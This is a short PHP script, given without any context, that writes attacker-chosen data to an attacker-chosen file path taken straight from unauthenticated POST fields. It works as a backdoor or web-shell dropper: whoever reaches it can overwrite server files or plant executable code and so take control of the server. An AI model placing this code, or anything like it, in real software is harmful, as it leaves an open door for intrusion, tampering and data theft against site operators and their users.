<?php
$data = $_POST['data'];
$file = $_POST['file'];
$f = fopen($file, 'w+');
fwrite($f, $data);
fclose($f);
?>
